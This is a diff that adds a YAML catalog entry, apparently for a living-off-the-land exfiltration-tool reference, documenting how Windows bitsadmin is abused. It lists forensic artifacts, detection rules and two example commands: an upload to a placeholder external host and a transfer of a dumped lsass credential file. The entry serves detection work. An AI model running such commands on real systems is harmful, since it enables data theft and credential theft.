@@ -1,0 +1,81 @@
+Name: bitsadmin
+Aliases:
+  - bits
+  - bitsadmin
+  - bitsadmin.exe
+Description: >
+    BITSAdmin is a native Windows command-line utility preinstalled on most systems, used to create and manage Background Intelligent Transfer Service (BITS) jobs for transferring data over protocols such as HTTP, HTTPS, and SMB.
+    While often abused for payload delivery, it has also been observed in exfiltration scenarios to transfer local files to remote destinations such as external URLs or admin shares.
+Category: native
+Platform:
+  - Windows
+Execution:
+  - cli
+Capabilities:
+  - stealth-upload            # Performs uploads without visible UI
+  - background-execution      # Operates silently via BITS service
+  - protocol-tunneling        # Uses HTTP(S)/UNC for transfer
+  - lolbas                    # Living-off-the-land binary
+  - remote-access             # Can send files to external servers
+Forensics:
+  BinaryLocations:
+    - C:\Windows\System32\bitsadmin.exe
+    - C:\Windows\SysWOW64\bitsadmin.exe
+  FileNamePatterns:
+    - bitsadmin.exe
+    - bitsadmin
+  CommandLineArgs:
+    Description: >
+      These arguments have been observed in BITSAdmin abuse related to data exfiltration.
+    Indicators:
+      - '/transfer'
+      - '/upload'
+      - '/priority'
+      - '\\<ip>\<share_name>\'
+      - 'http://*'
+      - 'https://*'
+  RegistryPersistence: 
+    - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\BITS
+    - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BITS
+  LogFiles:
+    - C:\Windows\System32\winevt\Logs\Microsoft-Windows-Bits-Client%4Operational.evtx
+    - C:\ProgramData\Microsoft\Network\Downloader\qmgr*.dat
+  NetworkArtifacts:
+    Description: >
+      BITS jobs may contact external domains using HTTP/S.
+      Look for outbound traffic to unknown hosts initiated by BITS.
+    Indicators:
+      - '/upload'
+      - 'http://*'
+      - 'https://*'
+  ScheduledTask: []
+ThreatActors:
+  - ransomware
+  - apt
+UseCases:
+  - Title: HTTP/S file upload
+    Description: Upload a file using `/upload` argument to external domains using HTTP/S.
+    Command: |
+      bitsadmin /transfer exfil /upload /priority normal http://<ip>/file.bak C:\path\to\file.bak
+  - Title: File upload to local admin share
+    Description: >
+      Exfiltration of previously dumped lsass process to a local share via bitsadmin.
+      Used in post-exploitation for credential theft.
+    Command: |
+      bitsadmin /transfer EvilUpload /upload /priority normal \\localhost\c$\done.dump C:\Users\Public\lsass.dmp
+Detection:
+  - Type: CLI Pattern Matching
+    Description: >
+      Detect usage of bitsadmin with the `/upload` flag. These often indicate outbound file transfer attempts.
+  - Type: Network Exfiltration via HTTP/S or SMB
+    Description: >
+      Monitor for outbound HTTP/HTTPS POST requests or SMB share access from endpoints using bitsadmin to external destinations.
+  - Type: BITS Job Abuse
+    Description: >
+      Monitor BITS-Client Operational logs for upload jobs (Event ID 60, 59), especially with job names like "Upload", "Exfil", or arbitrary names, and destinations that do not match enterprise infrastructure or known software update services.
+References:
+  - https://attack.mitre.org/software/S0375/
+  - https://attack.mitre.org/techniques/T1048/003/
+  - https://attack.mitre.org/techniques/T1197/
+  - https://www.iranwatch.org/sites/default/files/public-intelligence-alert.pdf
+LastModified: '2025-12-19'
